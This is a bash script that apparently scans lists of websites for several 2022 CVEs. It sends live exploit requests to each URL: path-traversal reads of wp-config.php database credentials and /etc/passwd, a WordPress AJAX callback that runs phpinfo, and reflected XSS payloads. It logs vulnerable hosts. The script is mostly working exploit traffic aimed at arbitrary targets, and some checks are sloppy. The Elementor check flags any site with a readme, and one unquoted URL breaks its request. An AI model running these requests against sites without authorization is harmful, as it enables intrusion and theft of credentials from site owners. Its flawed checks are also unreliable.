#!/bin/bash

#Main task is to visit site as low as possible



Target="$1"
var="$2"
BLUE='\033[94m'
COLOFF='\e[0m'
RED='\033[91m'
GREEN='\033[92m'
ORANGE='\033[93m'

echo -e "$RED ########### Welcome to CVE checks   ############### $COLOFF"
echo -e "$BLUE ########### 1. Wordpress CVEs check ############## $COLOFF"
echo -e "$BLUE ########### 2. Others check ############## $COLOFF"
read choice
#echo "hello"

if [ $choice = "1" ]
then
    while IFS= read -r url; 
    do

        if curl -i --max-time 15 -X POST -d "option_key=a&perpose=update&callback=phpinfo"  $url/wp-admin/admin-ajax.php?action=wpt_admin_update_notice_option | grep -E ">PHP Version <\/td><td class="v">([0-9.]+)" ; then
            # CVE-2022-1020
            ( echo "Vulnerable with CVE-2022-1020" ; echo "References: https://wpscan.com/vulnerability/04fe89b3-8ad1-482f-a96d-759d1d3a0dd5" ) >> technologies/$( echo "$url" | awk -F/ '{print $3}')
        fi

        if  curl -i --max-time 15  $url/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php | grep -E "DB_NAME|DB_PASSWORD" ; then
            # CVE-2022-1119
            ( echo "Vulnerable with CVE-2022-1119 " ; echo "Reference: https://nvd.nist.gov/vuln/detail/CVE-2022-1119 " ) >> technologies/$( echo "$url" | awk -F/ '{print $3}')
        fi

        if  curl -i --max-time 15  $url/wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1&class=%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E | grep -E "</script><script>alert(document.domain)</script> " ; then
            # CVE-2022-1221
            ( echo "Vulnerable with CVE-2022-1221 " ; echo "References: https://wpscan.com/vulnerability/641be9f6-2f74-4386-b16e-4b9488f0d2a9 " ) >> technologies/$( echo "$url" | awk -F/ '{print $3}')
        fi

        if  curl -i --max-time 15  $url/wp-content/plugins/elementor/readme.txt | grep -i -E "(?m)Stable tag: ([0-9.]+)" ; then
            # CVE-2022-29455
            ( echo "Vulnerable with CVE-2022-29455 " ; echo "References: https://nvd.nist.gov/vuln/detail/CVE-2022-29455 " ) >> technologies/$( echo "$url" | awk -F/ '{print $3}')
        fi

    


    done < wp-sites.txt

elif [ $choice = "2" ]
then
   # echo "hello 2"
    while IFS= read -r url; 
    do

        if cat curled_urls/$( echo "$url" | awk -F/ '{print $3}') | grep -E -i -q "Solar_menu" ; then 
            #echo "found"
            curl -i -k --max-time 15  $url/downloader.php?file=../../../../../../../../../../../../../etc/passwd%00.jpg > testing.txt
            if  cat testing.txt | grep -i -E -q "root:" ; then
            
            # CVE-2022-29298
            #echo "found it"
            echo -e "Vulnerable with CVE-2022-29298 \n References: https://www.exploit-db.com/exploits/50950 "  >> technologies/$( echo "$url" | awk -F/ '{print $3}')
            fi

        fi


        if cat curled_urls/$( echo "$url" | awk -F/ '{print $3}') | grep -q -E -i "ZEROF" ; then 

            curl -i -k --max-time 15  "$url/admin.back<img%20src=x%20onerror=alert(document.domain)>" > testing.txt
            #echo "test zerof"
            #cat testing.txt | grep "alert"

            if  cat testing.txt | grep -i -E -q 'alert' ; then
                # CVE-2022-25323
                echo -e "Vulnerable with CVE-2022-25323 \nReferences: https://github.com/awillix/research/blob/main/cve/CVE-2022-25323.md "  >> technologies/$( echo "$url" | awk -F/ '{print $3}')
            fi

        fi

        if cat curled_urls/$( echo "$url" | awk -F/ '{print $3}') | grep -q -E -i "Trilium " ; then 

            curl -i -k --max-time 15  "$url/custom/%3Cimg%20src=x%20onerror=alert(document.domain)%3E" > testing.txt
            #echo "test zerof"
            #cat testing.txt | grep "alert"

            if  cat testing.txt | grep -i -E -q 'alert' ; then
                #  CVE-2022-2290
                echo -e "Vulnerable with CVE-2022-2290 \nReferences: https://nvd.nist.gov/vuln/detail/CVE-2022-2290 "  >> technologies/$( echo "$url" | awk -F/ '{print $3}')
            fi

        fi
        
    done < temp.txt
fi
